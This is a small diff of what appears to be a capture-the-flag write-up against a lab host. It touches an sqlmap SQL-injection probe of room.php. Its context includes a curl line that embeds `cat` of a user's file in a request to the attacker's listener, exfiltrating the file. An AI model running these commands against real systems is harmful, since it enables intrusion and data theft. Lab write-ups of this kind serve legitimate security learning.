@@ -119,7 +119,7 @@ sudo docker run -it --rm -p 3306:3306 -e MYSQL_ROOT_PASSWORD=toor mariadb:latest
 After much fiddling, it felt like I was down a rabbit hold, so I started poking around the web content some more. Looking at a room page, http://10.10.10.143/room.php?cod=1 the url contains a parameter. Changing this to a single quote results in a page with no room content loaded, so I thought I'd try using SQLmap to probe for SQLi.
 
 ```
-sqlmap -u http://10.10.10.143/room.php\?cod\=1 -p cod                                          ✘ 1 
+sqlmap -u http://10.10.10.143/room.php\?cod\=1 -p cod
         ___
        __H__
  ___ ___[(]_____ ___ ___  {1.3.7#stable}
@@ -379,3 +379,5 @@ curl 10.10.14.2:8000/`cat /home/pepper/user.txt`
 ```
 
 So now, how do we get an easier to use command shell?
+
+
